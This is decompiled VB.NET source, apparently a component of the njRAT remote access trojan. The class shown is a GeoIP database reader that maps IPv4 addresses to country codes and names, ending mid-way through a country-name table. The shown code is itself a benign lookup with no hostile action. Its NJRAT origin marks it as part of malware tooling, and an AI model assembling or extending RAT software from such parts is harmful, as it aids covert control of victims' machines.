Imports System
Imports System.IO
Imports System.Net
Imports System.Runtime.CompilerServices
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x0200004C RID: 76
	Public NotInheritable Class GClass3
		' Token: 0x0600074D RID: 1869 RVA: 0x00003BE6 File Offset: 0x00001DE6
		Public Sub New(string_3 As String)
			Me.New(string_3, GClass3.int_20)
		End Sub

		' Token: 0x0600074E RID: 1870 RVA: 0x00041374 File Offset: 0x0003F574
		Public Sub New(string_3 As String, int_26 As Integer)
			Me.fileStream_0 = Nothing
			Me.gclass5_0 = Nothing
			Me.object_0 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(New Object())))
			Me.byte_0 = Convert.ToByte(GClass5.int_0)
			Me.int_3 = 0
			Try
				Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Me.object_0)
				ObjectFlowControl.CheckForSyncLockOnValueType(RuntimeHelpers.GetObjectValue(objectValue))
				Dim obj As Object = objectValue
				ObjectFlowControl.CheckForSyncLockOnValueType(obj)
				SyncLock obj
					Me.fileStream_0 = New FileStream(string_3, FileMode.Open, FileAccess.Read)
				End SyncLock
				Me.int_2 = int_26
				Me.method_0()
			Catch ex As SystemException
				Console.Write("cannot open file " + string_3 + vbLf)
			End Try
		End Sub

		' Token: 0x0600074F RID: 1871 RVA: 0x0004145C File Offset: 0x0003F65C
		Private Sub method_0()
			Dim array As Byte() = New Byte(2) {}
			Dim array2 As Byte() = New Byte(GClass3.int_9 - 1 + 1 - 1 + 1 - 1) {}
			Me.byte_0 = CByte(GClass5.int_0)
			Me.int_1 = GClass3.int_10
			Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Me.object_0)
			ObjectFlowControl.CheckForSyncLockOnValueType(RuntimeHelpers.GetObjectValue(objectValue))
			Dim obj As Object = objectValue
			ObjectFlowControl.CheckForSyncLockOnValueType(obj)
			SyncLock obj
				Me.fileStream_0.Seek(-3L, SeekOrigin.[End])
				Dim num As Integer = GClass3.int_6 - 1
				For i As Integer = 0 To num
					Me.fileStream_0.Read(array, 0, 3)
					If array(0) = 255 AndAlso array(1) = 255 AndAlso array(2) = 255 Then
						Me.byte_0 = Convert.ToByte(Me.fileStream_0.ReadByte())
						If Me.byte_0 >= 106 Then
							Me.byte_0 -= 105
						End If
						If CInt(Me.byte_0) = GClass5.int_1 Then
							Me.int_0 = New Integer() { GClass3.int_15 }
							Me.int_1 = GClass3.int_10
						ElseIf CInt(Me.byte_0) = GClass5.int_2 Then
							Me.int_0 = New Integer() { GClass3.int_16 }
							Me.int_1 = GClass3.int_10
						Else
							If CInt(Me.byte_0) <> GClass5.int_3 Then
								If CInt(Me.byte_0) <> GClass5.int_4 Then
									If CInt(Me.byte_0) <> GClass5.int_5 Then
										If CInt(Me.byte_0) <> GClass5.int_14 Then
											If CInt(Me.byte_0) <> GClass5.int_6 Then
												If CInt(Me.byte_0) <> GClass5.int_13 Then
													If CInt(Me.byte_0) <> GClass5.int_8 Then
														If CInt(Me.byte_0) <> GClass5.int_12 Then
															If CInt(Me.byte_0) <> GClass5.int_18 Then
																If CInt(Me.byte_0) <> GClass5.int_19 Then
																	If CInt(Me.byte_0) <> GClass5.int_17 AndAlso CInt(Me.byte_0) <> GClass5.int_16 Then
																		Exit For
																	End If
																End If
															End If
														End If
													End If
												End If
											End If
										End If
									End If
								End If
							End If
							Me.int_0 = New Integer() { 0 }
							If CInt(Me.byte_0) <> GClass5.int_3 Then
								If CInt(Me.byte_0) <> GClass5.int_4 Then
									If CInt(Me.byte_0) <> GClass5.int_12 Then
										If CInt(Me.byte_0) <> GClass5.int_18 Then
											If CInt(Me.byte_0) <> GClass5.int_19 Then
												If CInt(Me.byte_0) <> GClass5.int_17 Then
													If CInt(Me.byte_0) <> GClass5.int_16 AndAlso CInt(Me.byte_0) <> GClass5.int_8 Then
														Me.int_1 = GClass3.int_11
														GoTo IL_2C6
													End If
												End If
											End If
										End If
									End If
								End If
							End If
							Me.int_1 = GClass3.int_10
							IL_2C6:
							Me.fileStream_0.Read(array2, 0, GClass3.int_9)
							Dim num2 As Integer = GClass3.int_9 - 1
							For j As Integer = 0 To num2
								Me.int_0(0) = Me.int_0(0) + (GClass3.smethod_2(array2(j)) << j * 8)
							Next
						End If
						IL_31A:
						If CInt(Me.byte_0) <> GClass5.int_0 Then
							If CInt(Me.byte_0) <> GClass5.int_11 Then
								If CInt(Me.byte_0) <> GClass5.int_7 AndAlso CInt(Me.byte_0) <> GClass5.int_9 Then
									GoTo IL_376
								End If
							End If
						End If
						Me.int_0 = New Integer() { GClass3.int_4 }
						Me.int_1 = GClass3.int_10
						IL_376:
						If(Me.int_2 And GClass3.int_21) = 1 Then
							Dim num3 As Integer = CInt(Me.fileStream_0.Length)
							Me.byte_1 = New Byte(num3 - 1 + 1 - 1 + 1 - 1) {}
							Me.fileStream_0.Seek(0L, SeekOrigin.Begin)
							Me.fileStream_0.Read(Me.byte_1, 0, num3)
						End If
						Return
					End If
					Me.fileStream_0.Seek(-4L, SeekOrigin.Current)
				Next
				GoTo IL_31A
			End SyncLock
		End Sub

		' Token: 0x06000750 RID: 1872 RVA: 0x00041864 File Offset: 0x0003FA64
		Public Sub method_1()
			Try
				Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Me.object_0)
				ObjectFlowControl.CheckForSyncLockOnValueType(RuntimeHelpers.GetObjectValue(objectValue))
				Dim obj As Object = objectValue
				ObjectFlowControl.CheckForSyncLockOnValueType(obj)
				SyncLock obj
					Me.fileStream_0.Close()
				End SyncLock
				Me.fileStream_0 = Nothing
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000751 RID: 1873 RVA: 0x000418EC File Offset: 0x0003FAEC
		Public Function method_10() As GClass5
			Dim result As GClass5
			If Me.gclass5_0 IsNot Nothing Then
				result = Me.gclass5_0
			Else
				Try
					Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Me.object_0)
					ObjectFlowControl.CheckForSyncLockOnValueType(RuntimeHelpers.GetObjectValue(objectValue))
					Dim obj As Object = objectValue
					ObjectFlowControl.CheckForSyncLockOnValueType(obj)
					SyncLock obj
						Dim flag As Boolean = False
						Dim array As Byte() = New Byte(2) {}
						Me.fileStream_0.Seek(-3L, SeekOrigin.[End])
						Dim num As Integer = GClass3.int_6 - 1
						For i As Integer = 0 To num
							Me.fileStream_0.Read(array, 0, 3)
							If array(0) = 255 AndAlso array(1) = 255 AndAlso array(2) = 255 Then
								flag = True
								IL_C8:
								If flag Then
									Me.fileStream_0.Seek(-6L, SeekOrigin.Current)
								Else
									Me.fileStream_0.Seek(-3L, SeekOrigin.[End])
								End If
								Dim num2 As Integer = GClass3.int_7 - 1
								For j As Integer = 0 To num2
									Me.fileStream_0.Read(array, 0, 3)
									If array(0) = 0 AndAlso array(1) = 0 AndAlso array(2) = 0 Then
										Dim array2 As Byte() = New Byte(j - 1 + 1 - 1 + 1 - 1) {}
										Dim array3 As Char() = New Char(j - 1 + 1 - 1 + 1 - 1) {}
										Me.fileStream_0.Read(array2, 0, j)
										Dim num3 As Integer = j - 1
										For k As Integer = 0 To num3
											array3(k) = Convert.ToChar(array2(k))
										Next
										Me.gclass5_0 = New GClass5(New String(array3))
										Return Me.gclass5_0
									End If
									Me.fileStream_0.Seek(-4L, SeekOrigin.Current)
								Next
								GoTo IL_1D5
							End If
							Me.fileStream_0.Seek(-4L, SeekOrigin.Current)
						Next
						GoTo IL_C8
					End SyncLock
					IL_1D5:
				Catch ex As Exception
					Dim ex2 As Exception = ex
					Console.Write(ex2.Message)
				End Try
				result = New GClass5(String.Empty)
			End If
			Return result
		End Function

		' Token: 0x06000752 RID: 1874 RVA: 0x00041B3C File Offset: 0x0003FD3C
		Public Function method_11(ipaddress_0 As IPAddress) As GClass6
			Return Me.method_12(Conversions.ToString(GClass3.smethod_1(ipaddress_0.GetAddressBytes())))
		End Function

		' Token: 0x06000753 RID: 1875 RVA: 0x00041B64 File Offset: 0x0003FD64
		Public Function method_12(string_3 As String) As GClass6
			Dim ipaddress As IPAddress
			Try
				ipaddress = IPAddress.Parse(string_3)
			Catch ex As Exception
				Dim ex2 As Exception = ex
				Console.Write(ex2.Message)
				Return Nothing
			End Try
			Return Me.method_12(Conversions.ToString(GClass3.smethod_1(ipaddress.GetAddressBytes())))
		End Function

		' Token: 0x06000754 RID: 1876 RVA: 0x00041BCC File Offset: 0x0003FDCC
		Public Function method_13(ipaddress_0 As IPAddress) As String
			Return Me.method_17(GClass3.smethod_1(ipaddress_0.GetAddressBytes()))
		End Function

		' Token: 0x06000755 RID: 1877 RVA: 0x00041BEC File Offset: 0x0003FDEC
		Public Function method_14(string_3 As String) As String
			Dim ipaddress_ As IPAddress
			Try
				ipaddress_ = IPAddress.Parse(string_3)
			Catch ex As Exception
				Dim ex2 As Exception = ex
				Console.Write(ex2.Message)
				Return Nothing
			End Try
			Return Me.method_16(ipaddress_)
		End Function

		' Token: 0x06000756 RID: 1878 RVA: 0x00041C44 File Offset: 0x0003FE44
		Public Function method_15(string_3 As String) As String
			Dim ipaddress As IPAddress
			Try
				ipaddress = IPAddress.Parse(string_3)
			Catch ex As Exception
				Dim ex2 As Exception = ex
				Console.Write(ex2.Message)
				Return Nothing
			End Try
			Return Me.method_17(GClass3.smethod_1(ipaddress.GetAddressBytes()))
		End Function

		' Token: 0x06000757 RID: 1879 RVA: 0x00041CA8 File Offset: 0x0003FEA8
		<MethodImpl(MethodImplOptions.Synchronized)>
		Public Function method_16(ipaddress_0 As IPAddress) As String
			Dim num As Integer = 0
			Dim array As Byte() = New Byte(GClass3.int_13 - 1 + 1 - 1 + 1 - 1) {}
			Dim array2 As Char() = New Char(GClass3.int_13 - 1 + 1 - 1 + 1 - 1) {}
			Dim result As String
			Try
				Dim num2 As Integer = Me.method_18(ipaddress_0)
				If num2 = Me.int_0(0) Then
					Return Nothing
				End If
				Dim num3 As Integer = num2 + (2 * Me.int_1 - 1) * Me.int_0(0)
				If(Me.int_2 And GClass3.int_21) = 1 Then
					Array.Copy(Me.byte_1, num3, array, 0, Math.Min(Me.byte_1.Length - num3, GClass3.int_13))
					GoTo IL_FC
				End If
				Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Me.object_0)
				ObjectFlowControl.CheckForSyncLockOnValueType(RuntimeHelpers.GetObjectValue(objectValue))
				Dim obj As Object = objectValue
				ObjectFlowControl.CheckForSyncLockOnValueType(obj)
				SyncLock obj
					Me.fileStream_0.Seek(CLng(num3), SeekOrigin.Begin)
					Me.fileStream_0.Read(array, 0, GClass3.int_13)
					GoTo IL_FC
				End SyncLock
				IL_ED:
				array2(num) = Convert.ToChar(array(num))
				num += 1
				IL_FC:
				If array(num) <> 0 Then
					GoTo IL_ED
				End If
				array2(num) = vbNullChar
				result = New String(array2, 0, num)
			Catch ex As IOException
				Console.Write("IO Exception")
				result = Nothing
			End Try
			Return result
		End Function

		' Token: 0x06000758 RID: 1880 RVA: 0x00041E14 File Offset: 0x00040014
		<MethodImpl(MethodImplOptions.Synchronized)>
		Public Function method_17(long_0 As Long) As String
			Dim num As Integer = 0
			Dim array As Byte() = New Byte(GClass3.int_13 - 1 + 1 - 1 + 1 - 1) {}
			Dim array2 As Char() = New Char(GClass3.int_13 - 1 + 1 - 1 + 1 - 1) {}
			Dim result As String
			Try
				Dim num2 As Integer = Me.method_19(long_0)
				If num2 = Me.int_0(0) Then
					Return Nothing
				End If
				Dim num3 As Integer = num2 + (2 * Me.int_1 - 1) * Me.int_0(0)
				If(Me.int_2 And GClass3.int_21) = 1 Then
					Array.Copy(Me.byte_1, num3, array, 0, Math.Min(Me.byte_1.Length - num3, GClass3.int_13))
					GoTo IL_FC
				End If
				Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Me.object_0)
				ObjectFlowControl.CheckForSyncLockOnValueType(RuntimeHelpers.GetObjectValue(objectValue))
				Dim obj As Object = objectValue
				ObjectFlowControl.CheckForSyncLockOnValueType(obj)
				SyncLock obj
					Me.fileStream_0.Seek(CLng(num3), SeekOrigin.Begin)
					Me.fileStream_0.Read(array, 0, GClass3.int_13)
					GoTo IL_FC
				End SyncLock
				IL_ED:
				array2(num) = Convert.ToChar(array(num))
				num += 1
				IL_FC:
				If array(num) <> 0 Then
					GoTo IL_ED
				End If
				array2(num) = vbNullChar
				result = New String(array2, 0, num)
			Catch ex As IOException
				Console.Write("IO Exception")
				result = Nothing
			End Try
			Return result
		End Function

		' Token: 0x06000759 RID: 1881 RVA: 0x00041F80 File Offset: 0x00040180
		<MethodImpl(MethodImplOptions.Synchronized)>
		Private Function method_18(ipaddress_0 As IPAddress) As Integer
			Dim addressBytes As Byte() = ipaddress_0.GetAddressBytes()
			Dim array As Byte() = New Byte(2 * GClass3.int_12 - 1 + 1 - 1 + 1 - 1) {}
			Dim array2 As Integer() = New Integer(1) {}
			Dim num As Integer = 0
			Dim num2 As Integer = 127
			While True
				Try
					If(Me.int_2 And GClass3.int_21) = 1 Then
						Dim num3 As Integer = 2 * GClass3.int_12 - 1
						For i As Integer = 0 To num3
							array(i) = Me.byte_1(i + 2 * Me.int_1 * num)
						Next
					Else
						Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Me.object_0)
						ObjectFlowControl.CheckForSyncLockOnValueType(RuntimeHelpers.GetObjectValue(objectValue))
						Dim obj As Object = objectValue
						ObjectFlowControl.CheckForSyncLockOnValueType(obj)
						SyncLock obj
							Me.fileStream_0.Seek(CLng((2 * Me.int_1 * num)), SeekOrigin.Begin)
							Me.fileStream_0.Read(array, 0, 2 * GClass3.int_12)
						End SyncLock
					End If
					GoTo IL_1E3
				Catch ex As IOException
					Console.Write("IO Exception")
					GoTo IL_1E3
				End Try
				GoTo IL_106
				IL_146:
				Dim num4 As Integer
				Dim num5 As Integer
				Dim num6 As Integer
				If num4 > num5 Then
					num6 += 1
					If num6 <= 1 Then
						GoTo IL_161
					End If
					Dim num7 As Integer = 127 - num2
					Dim num8 As Integer = num7 >> 3
					Dim num9 As Integer = 1 << ((num7 And 7) Xor 7)
					If(CInt(addressBytes(num8)) And num9) > 0 Then
						If array2(1) >= Me.int_0(0) Then
							GoTo IL_1EB
						End If
						num = array2(1)
					Else
						If array2(0) >= Me.int_0(0) Then
							GoTo IL_20B
						End If
						num = array2(0)
					End If
					num2 += -1
					If num2 < 0 Then
						Exit For
					End If
					Continue For
				End If
				IL_106:
				Dim num10 As Integer = CInt(array(num6 * Me.int_1 + num4))
				If num10 < 0 Then
					num10 += 256
				End If
				Dim num11 As Integer = num6
				array2(num11) += num10 << num4 * 8
				num4 += 1
				GoTo IL_146
				IL_161:
				array2(num6) = 0
				num5 = Me.int_1 - 1
				num4 = 0
				GoTo IL_146
				IL_1E3:
				num6 = 0
				GoTo IL_161
			End While
			Console.Write("Error Seeking country while Seeking " + Convert.ToString(ipaddress_0))
			Return 0
			IL_1EB:
			Return array2(1)
			IL_20B:
			Return array2(0)
		End Function

		' Token: 0x0600075A RID: 1882 RVA: 0x000421BC File Offset: 0x000403BC
		<MethodImpl(MethodImplOptions.Synchronized)>
		Private Function method_19(long_0 As Long) As Integer
			Dim array As Byte() = New Byte(2 * GClass3.int_12 - 1 + 1 - 1 + 1 - 1) {}
			Dim array2 As Integer() = New Integer(1) {}
			Dim num As Integer = 0
			Dim num2 As Integer = 31
			While True
				Try
					If(Me.int_2 And GClass3.int_21) = 1 Then
						Dim num3 As Integer = 2 * GClass3.int_12 - 1
						For i As Integer = 0 To num3
							array(i) = Me.byte_1(i + 2 * Me.int_1 * num)
						Next
					Else
						Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Me.object_0)
						ObjectFlowControl.CheckForSyncLockOnValueType(RuntimeHelpers.GetObjectValue(objectValue))
						Dim obj As Object = objectValue
						ObjectFlowControl.CheckForSyncLockOnValueType(obj)
						SyncLock obj
							Me.fileStream_0.Seek(CLng((2 * Me.int_1 * num)), SeekOrigin.Begin)
							Me.fileStream_0.Read(array, 0, 2 * GClass3.int_12)
						End SyncLock
					End If
					GoTo IL_1C8
				Catch ex As IOException
					Console.Write("IO Exception")
					GoTo IL_1C8
				End Try
				GoTo IL_FE
				IL_13E:
				Dim num4 As Integer
				Dim num5 As Integer
				Dim num6 As Integer
				If num4 > num5 Then
					num6 += 1
					If num6 <= 1 Then
						GoTo IL_159
					End If
					If(long_0 And 1L << (num2 And 31)) > 0L Then
						If array2(1) >= Me.int_0(0) Then
							GoTo IL_1CD
						End If
						num = array2(1)
					Else
						If array2(0) >= Me.int_0(0) Then
							GoTo IL_1ED
						End If
						num = array2(0)
					End If
					num2 += -1
					If num2 < 0 Then
						Exit For
					End If
					Continue For
				End If
				IL_FE:
				Dim num7 As Integer = CInt(array(num6 * Me.int_1 + num4))
				If num7 < 0 Then
					num7 += 256
				End If
				Dim num8 As Integer = num6
				array2(num8) += num7 << num4 * 8
				num4 += 1
				GoTo IL_13E
				IL_159:
				array2(num6) = 0
				num5 = Me.int_1 - 1
				num4 = 0
				GoTo IL_13E
				IL_1C8:
				num6 = 0
				GoTo IL_159
			End While
			Console.Write("Error Seeking country while Seeking " + Conversions.ToString(long_0))
			Return 0
			IL_1CD:
			Return array2(1)
			IL_1ED:
			Return array2(0)
		End Function

		' Token: 0x0600075B RID: 1883 RVA: 0x000423D8 File Offset: 0x000405D8
		Public Function method_2(ipaddress_0 As IPAddress) As GClass4
			Return Me.method_6(GClass3.smethod_1(ipaddress_0.GetAddressBytes()))
		End Function

		' Token: 0x0600075C RID: 1884 RVA: 0x000423F8 File Offset: 0x000405F8
		Public Function method_3(string_3 As String) As GClass4
			Dim ipaddress_ As IPAddress
			Try
				ipaddress_ = IPAddress.Parse(string_3)
			Catch ex As Exception
				Dim ex2 As Exception = ex
				Console.Write(ex2.Message)
				Return GClass3.gclass4_0
			End Try
			Return Me.method_5(ipaddress_)
		End Function

		' Token: 0x0600075D RID: 1885 RVA: 0x0004245C File Offset: 0x0004065C
		Public Function method_4(string_3 As String) As GClass4
			Dim ipaddress As IPAddress
			Try
				ipaddress = IPAddress.Parse(string_3)
			Catch ex As Exception
				Dim ex2 As Exception = ex
				Console.Write(ex2.Message)
				Return GClass3.gclass4_0
			End Try
			Return Me.method_6(GClass3.smethod_1(ipaddress.GetAddressBytes()))
		End Function

		' Token: 0x0600075E RID: 1886 RVA: 0x000424C8 File Offset: 0x000406C8
		Public Function method_5(ipaddress_0 As IPAddress) As GClass4
			If Me.fileStream_0 Is Nothing Then
				Throw New Exception("Database has been closed.")
			End If
			Dim result As GClass4
			If CInt(Me.byte_0) = GClass5.int_4 Or CInt(Me.byte_0) = GClass5.int_3 Then
				Dim gclass As GClass6 = Me.method_11(ipaddress_0)
				If gclass Is Nothing Then
					result = GClass3.gclass4_0
				Else
					result = New GClass4(gclass.string_0, gclass.string_1)
				End If
			Else
				Dim num As Integer = Me.method_18(ipaddress_0) - GClass3.int_4
				If num = 0 Then
					result = GClass3.gclass4_0
				Else
					result = New GClass4(GClass3.string_1(num), GClass3.string_2(num))
				End If
			End If
			Return result
		End Function

		' Token: 0x0600075F RID: 1887 RVA: 0x00042564 File Offset: 0x00040764
		Public Function method_6(long_0 As Long) As GClass4
			If Me.fileStream_0 Is Nothing Then
				Throw New Exception("Database has been closed.")
			End If
			Dim result As GClass4
			If CInt(Me.byte_0) = GClass5.int_4 Or CInt(Me.byte_0) = GClass5.int_3 Then
				Dim gclass As GClass6 = Me.method_12(Conversions.ToString(long_0))
				If gclass Is Nothing Then
					result = GClass3.gclass4_0
				Else
					result = New GClass4(gclass.string_0, gclass.string_1)
				End If
			Else
				Dim num As Integer = Me.method_19(long_0) - GClass3.int_4
				If num = 0 Then
					result = GClass3.gclass4_0
				Else
					result = New GClass4(GClass3.string_1(num), GClass3.string_2(num))
				End If
			End If
			Return result
		End Function

		' Token: 0x06000760 RID: 1888 RVA: 0x00042604 File Offset: 0x00040804
		Public Function method_7(string_3 As String) As Integer
			Dim ipaddress As IPAddress
			Try
				ipaddress = IPAddress.Parse(string_3)
			Catch ex As Exception
				Dim ex2 As Exception = ex
				Console.Write(ex2.Message)
				Return 0
			End Try
			Return Me.method_9(GClass3.smethod_1(ipaddress.GetAddressBytes()))
		End Function

		' Token: 0x06000761 RID: 1889 RVA: 0x00042668 File Offset: 0x00040868
		Public Function method_8(ipaddress_0 As IPAddress) As Integer
			Return Me.method_9(GClass3.smethod_1(ipaddress_0.GetAddressBytes()))
		End Function

		' Token: 0x06000762 RID: 1890 RVA: 0x00042688 File Offset: 0x00040888
		Public Function method_9(long_0 As Long) As Integer
			If Me.fileStream_0 Is Nothing Then
				Throw New Exception("Database has been closed.")
			End If
			Return Me.method_19(long_0) - Me.int_0(0)
		End Function

		' Token: 0x06000763 RID: 1891 RVA: 0x000426C0 File Offset: 0x000408C0
		Private Shared Function smethod_0(long_0 As Long) As Long
			Return(long_0 >> 0 And 255L) << 24 Or (long_0 >> 8 And 255L) << 16 Or (long_0 >> 16 And 255L) << 8 Or (long_0 >> 24 And 255L) << 0
		End Function

		' Token: 0x06000764 RID: 1892 RVA: 0x00042714 File Offset: 0x00040914
		Private Shared Function smethod_1(byte_2 As Byte()) As Long
			Dim num As Long = 0L
			Dim num2 As Integer = 0
			Do
				Dim num3 As Long = CLng(CULng(byte_2(num2)))
				If num3 < 0L Then
					num3 += 256L
				End If
				num += num3 << (3 - num2) * 8
				num2 += 1
			Loop While num2 <= 3
			Return num
		End Function

		' Token: 0x06000765 RID: 1893 RVA: 0x00042774 File Offset: 0x00040974
		Private Shared Function smethod_2(byte_2 As Byte) As Integer
			Return CInt((byte_2 And Byte.MaxValue))
		End Function

		' Token: 0x06000766 RID: 1894 RVA: 0x0003EADC File Offset: 0x0003CCDC
		Private Shared Function smethod_3(Of T)(ByRef gparam_0 As T, gparam_1 As T) As T
			gparam_0 = gparam_1
			Return gparam_1
		End Function

		' Token: 0x040003BF RID: 959
		Private byte_0 As Byte

		' Token: 0x040003C0 RID: 960
		Private byte_1 As Byte()

		' Token: 0x040003C1 RID: 961
		Private fileStream_0 As FileStream

		' Token: 0x040003C2 RID: 962
		Private Shared gclass4_0 As GClass4 = New GClass4("--", "N/A")

		' Token: 0x040003C3 RID: 963
		Private gclass5_0 As GClass5

		' Token: 0x040003C4 RID: 964
		Private int_0 As Integer()

		' Token: 0x040003C5 RID: 965
		Private int_1 As Integer

		' Token: 0x040003C6 RID: 966
		Private Shared int_10 As Integer = 3

		' Token: 0x040003C7 RID: 967
		Private Shared int_11 As Integer = 4

		' Token: 0x040003C8 RID: 968
		Private Shared int_12 As Integer = 4

		' Token: 0x040003C9 RID: 969
		Private Shared int_13 As Integer = 1000

		' Token: 0x040003CA RID: 970
		Private Shared int_14 As Integer = 360

		' Token: 0x040003CB RID: 971
		Private Shared int_15 As Integer = 16700000

		' Token: 0x040003CC RID: 972
		Private Shared int_16 As Integer = 16000000

		' Token: 0x040003CD RID: 973
		Private Shared int_17 As Integer = 1

		' Token: 0x040003CE RID: 974
		Private Shared int_18 As Integer = 677

		' Token: 0x040003CF RID: 975
		Private Shared int_19 As Integer = 1353

		' Token: 0x040003D0 RID: 976
		Private int_2 As Integer

		' Token: 0x040003D1 RID: 977
		Public Shared int_20 As Integer = 0

		' Token: 0x040003D2 RID: 978
		Public Shared int_21 As Integer = 1

		' Token: 0x040003D3 RID: 979
		Public Shared int_22 As Integer = 0

		' Token: 0x040003D4 RID: 980
		Public Shared int_23 As Integer = 1

		' Token: 0x040003D5 RID: 981
		Public Shared int_24 As Integer = 2

		' Token: 0x040003D6 RID: 982
		Public Shared int_25 As Integer = 3

		' Token: 0x040003D7 RID: 983
		Private int_3 As Integer

		' Token: 0x040003D8 RID: 984
		Private Shared int_4 As Integer = 16776960

		' Token: 0x040003D9 RID: 985
		Private Shared int_5 As Integer = 16700000

		' Token: 0x040003DA RID: 986
		Private Shared int_6 As Integer = 20

		' Token: 0x040003DB RID: 987
		Private Shared int_7 As Integer = 100

		' Token: 0x040003DC RID: 988
		Private Shared int_8 As Integer = 100

		' Token: 0x040003DD RID: 989
		Private Shared int_9 As Integer = 3

		' Token: 0x040003DE RID: 990
		Private object_0 As Object

		' Token: 0x040003DF RID: 991
		Private string_0 As String

		' Token: 0x040003E0 RID: 992
		Public Shared string_1 As String() = New String() { "--", "AP", "EU", "AD", "AE", "AF", "AG", "AI", "AL", "AM", "CW", "AO", "AQ", "AR", "AS", "AT", "AU", "AW", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH", "BI", "BJ", "BM", "BN", "BO", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA", "CC", "CD", "CF", "CG", "CH", "CI", "CK", "CL", "CM", "CN", "CO", "CR", "CU", "CV", "CX", "CY", "CZ", "DE", "DJ", "DK", "DM", "DO", "DZ", "EC", "EE", "EG", "EH", "ER", "ES", "ET", "FI", "FJ", "FK", "FM", "FO", "FR", "SX", "GA", "GB", "GD", "GE", "GF", "GH", "GI", "GL", "GM", "GN", "GP", "GQ", "GR", "GS", "GT", "GU", "GW", "GY", "HK", "HM", "HN", "HR", "HT", "HU", "ID", "IE", "IL", "IN", "IO", "IQ", "IR", "IS", "IT", "JM", "JO", "JP", "KE", "KG", "KH", "KI", "KM", "KN", "KP", "KR", "KW", "KY", "KZ", "LA", "LB", "LC", "LI", "LK", "LR", "LS", "LT", "LU", "LV", "LY", "MA", "MC", "MD", "MG", "MH", "MK", "ML", "MM", "MN", "MO", "MP", "MQ", "MR", "MS", "MT", "MU", "MV", "MW", "MX", "MY", "MZ", "NA", "NC", "NE", "NF", "NG", "NI", "NL", "NO", "NP", "NR", "NU", "NZ", "OM", "PA", "PE", "PF", "PG", "PH", "PK", "PL", "PM", "PN", "PR", "PS", "PT", "PW", "PY", "QA", "RE", "RO", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI", "SJ", "SK", "SL", "SM", "SN", "SO", "SR", "ST", "SV", "SY", "SZ", "TC", "TD", "TF", "TG", "TH", "TJ", "TK", "TM", "TN", "TO", "TL", "TR", "TT", "TV", "TW", "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC", "VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "RS", "ZA", "ZM", "ME", "ZW", "A1", "A2", "O1", "AX", "GG", "IM", "JE", "BL", "MF", "BQ", "SS", "O1" }

		' Token: 0x040003E1 RID: 993
		Private Shared string_2 As String() = New String() { "N/A", "Asia/Pacific Region", "Europe", "Andorra", "United Arab Emirates", "Afghanistan", "Antigua and Barbuda", "Anguilla", "Albania", "Armenia", "Curacao", "Angola", "Antarctica", "Argentina", "American Samoa", "Austria", "Australia", "Aruba", "Azerbaijan", "Bosnia and Herzegovina", "Barbados", "Bangladesh", "Belgium", "Burkina Faso", "Bulgaria", "Bahrain", "Burundi", "Benin", "Bermuda", "Brunei Darussalam", "Bolivia", "Brazil", "Bahamas", "Bhutan", "Bouvet Island", "Botswana", "Belarus", "Belize", "Canada", "Cocos (Keeling) Islands", "Congo, The Democratic Republic of the", "Central African Republic", "Congo", "Switzerland", "Cote D'Ivoire", "Cook Islands", "Chile", "Cameroon", "China", "Colombia", "Costa Rica", "Cuba", "Cape Verde", "Christmas Island", "Cyprus", "Czech Republic", "Germany", "Djibouti", "Denmark", "Dominica", "Dominican Republic", "Algeria", "Ecuador", "Estonia", "Egypt", "Western Sahara", "Eritrea", "Spain", "Ethiopia", "Finland", "Fiji", "Falkland Islands (Malvinas)", "Micronesia, Federated States of", "Faroe Islands", "France", "Sint Maarten (Dutch part)", "Gabon", "United Kingdom", "Grenada", "Georgia", "French Guiana", "Ghana", "Gibraltar", "Greenland", "Gambia", "Guinea", "Guadeloupe", "Equatorial Guinea", "Greece", "South Georgia and the South Sandwich Islands", "Guatemala", "Guam", "Guinea-Bissau", "Guyana", "Hong Kong", "Heard Island and McDonald Islands", "Honduras", "Croatia", "Haiti", "Hungary", "Indonesia", "Ireland", "Israel", "India", "British Indian Ocean Territory", "Iraq", "Iran, Islamic Republic of", "Iceland", "Italy", "Jamaica", "Jordan", "Japan", "Kenya", "Kyrgyzstan", "Cambodia", "Kiribati", "Comoros", "Saint Kitts and Nevis", "Korea, Democratic People's Republic of", "Korea, Republic of", "Kuwait", "Cayman Islands", "Kazakhstan", "Lao People's Democratic Republic", "Lebanon", "Saint Lucia", "Liechtenstein", "Sri Lanka", "Liberia", "Lesotho", "Lithuania", "Luxembourg", "Latvia", "Libya", "Morocco", "Monaco", "Moldova, Republic of", "Madagascar", "Marshall Islands", "Macedonia", "Mali", "Myanmar", "Mongolia", "Macau", "Northern Mariana Islands", "Martinique", "Mauritania", "Montserrat", "Malta", "Mauritius", "Maldives", "Malawi", "Mexico", "Malaysia", "Mozambique", "Namibia", "New Caledonia", "Niger", "Norfolk Island", "Nigeria", "Nicaragua", "Netherlands", "Norway", "Nepal", "Nauru", "Niue", "New Zealand", "Oman", "Panama", "Peru", "French Polynesia", "Papua New Guinea", "Philippines", "Pakistan", "Poland", "Saint Pierre and Miquelon", "Pitcairn Islands", "Puerto Rico", "Palestinian Territory", "Portugal", "Palau", "Paraguay", "Qatar", "Reunion", "Romania", "Russian Federation", "Rwanda", "Saudi Arabia", "Solomon Islands", "Seychelles", "Sudan", "Sweden", "Singapore", "Saint Helena", "Slovenia", "Svalbard and Jan Mayen", "Slovakia", "Sierra Leone", "San Marino", "Senegal", "Somalia", "Suriname", "Sao Tome and Principe", "El Salvador", "Syrian Arab Republic", "Swaziland", "Turks and Caicos Islands", "Chad", "French Southern Territories", "Togo", "Thailand", "Tajikistan", "Tokelau", "Turkmenistan", "Tunisia", "Tonga", "Timor-Leste", "Turkey", "Trinidad and Tobago", 